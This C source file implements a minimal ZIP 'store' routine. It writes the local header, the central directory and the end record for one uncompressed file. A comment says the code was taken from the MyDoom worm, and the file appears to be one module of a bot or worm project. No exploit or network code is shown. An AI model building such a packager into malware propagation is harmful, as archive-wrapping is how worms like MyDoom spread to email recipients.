#include "includes.h"
#include "functions.h"
#include "externs.h"

//ripped from mydoom :o
#pragma pack(push, 1)
struct zip_header_t {
	DWORD signature;		/* 0x04034b50 */
	WORD ver_needed;
	WORD flags;
	WORD method;
	WORD lastmod_time;
	WORD lastmod_date;
	DWORD crc;
	DWORD compressed_size;
	DWORD uncompressed_size;
	WORD filename_length;
	WORD extra_length;
};

struct zip_eod_t {
	DWORD signature;		/* 0x06054b50 */
	WORD disk_no;
	WORD disk_dirst;
	WORD disk_dir_entries;
	WORD dir_entries;
	DWORD dir_size;
	DWORD dir_offs;
	WORD comment_len;
};

struct zip_dir_t {
	DWORD signature;	/* 0x02014b50 */
	WORD made_by;
	WORD ver_needed;
	WORD flags;
	WORD method;
	WORD lastmod_time;
	WORD lastmod_date;
	DWORD crc;
	DWORD compressed_size;
	DWORD uncompressed_size;
	WORD filename_length;
	WORD extra_length;
	WORD comment_length;
	WORD disk_no;
	WORD internal_attr;
	DWORD external_attr;
	DWORD local_offs;
};
#pragma pack(pop)


static void zip_putcurtime(WORD *f_time, WORD *f_date)
{
	SYSTEMTIME systime;

	GetSystemTime(&systime);
	if ((systime.wYear < 1999) || (systime.wYear > 2010))
		systime.wYear = 2004;
	if (systime.wMonth < 1 || systime.wMonth > 12) systime.wMonth = 1;
	if (systime.wDay < 1 || systime.wDay > 31) systime.wDay = 10;

	*f_date =
		((systime.wYear-1980) << 9) |
		(systime.wMonth << 5) |
		systime.wDay;

	*f_time =
		(systime.wHour << 11) |
		(systime.wMinute << 5) |
		(systime.wSecond / 2);
}

static unsigned long zip_calc_crc32(HANDLE hFileIn)
{
	unsigned long reg, i;
	unsigned char buf[1024];
	SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
	for (reg=0;;) {
		i = 0;
		if (ReadFile(hFileIn, buf, sizeof(buf), &i, NULL) == 0) break;
		if (i == 0) break;
		reg = crc32(reg, buf, i);
	}
	SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
	return reg;
}

int zip_store(char *in, char *out, char *store_as)
{
	HANDLE hFileIn, hFileOut;
	struct zip_header_t hdr1;
	struct zip_eod_t eod1;
	struct zip_dir_t dir1;
	char buf[1024];
	unsigned long i, j, offs;

	hFileIn = CreateFile(in, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFileIn == INVALID_HANDLE_VALUE || hFileIn == NULL)
		return 1;
	hFileOut = CreateFile(out, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFileOut == INVALID_HANDLE_VALUE || hFileOut == NULL) {
		CloseHandle(hFileIn);
		return 2;
	}

	memset(&hdr1, '\0', sizeof(hdr1));
	memset(&dir1, '\0', sizeof(dir1));
	memset(&eod1, '\0', sizeof(eod1));
	offs = 0;

	hdr1.signature = 0x04034b50;
	dir1.ver_needed = hdr1.ver_needed = 10;
	dir1.flags = hdr1.flags = 0;
	dir1.method = hdr1.method = 0;
	zip_putcurtime(&hdr1.lastmod_time, &hdr1.lastmod_date);
	dir1.lastmod_time = hdr1.lastmod_time;
	dir1.lastmod_date = hdr1.lastmod_date;
	hdr1.crc = zip_calc_crc32(hFileIn);
	dir1.crc = hdr1.crc;

	hdr1.compressed_size = GetFileSize(hFileIn, NULL);
	dir1.compressed_size = hdr1.compressed_size;
	hdr1.uncompressed_size = GetFileSize(hFileIn, NULL);
	dir1.uncompressed_size = hdr1.uncompressed_size;
	hdr1.filename_length = lstrlen(store_as);
	dir1.filename_length = hdr1.filename_length;
	dir1.extra_length = hdr1.extra_length = 0;

	dir1.local_offs = offs;

	WriteFile(hFileOut, &hdr1, sizeof(hdr1), &i, NULL);
	offs += sizeof(hdr1);
	WriteFile(hFileOut, store_as, lstrlen(store_as), &i, NULL);
	offs += lstrlen(store_as);
	SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
	for (;;) {
		i = 0;
		if (ReadFile(hFileIn, buf, sizeof(buf), &i, NULL) == 0) break;
		if (i == 0) break;
		WriteFile(hFileOut, buf, i, &j, NULL);
		offs += i;
	}

	eod1.dir_offs = offs;

	dir1.signature = 0x02014b50;
	dir1.made_by = 20;		/* MSDOS, PKZIP 2.0 */
	dir1.internal_attr = 0;
	dir1.external_attr = 0x20;	/* FA_ARCHIVE */
	WriteFile(hFileOut, &dir1, sizeof(dir1), &i, NULL);
	offs += sizeof(dir1);
	WriteFile(hFileOut, store_as, lstrlen(store_as), &i, NULL);
	offs += lstrlen(store_as);

	eod1.signature = 0x06054b50;
	eod1.disk_no = 0;
	eod1.disk_dirst = 0;
	eod1.disk_dir_entries = 1;
	eod1.dir_entries = eod1.disk_dir_entries;
	eod1.dir_size = offs - eod1.dir_offs;
	eod1.comment_len = 0;
	WriteFile(hFileOut, &eod1, sizeof(eod1), &i, NULL);

	CloseHandle(hFileOut);
	CloseHandle(hFileIn);
	return 0;
}

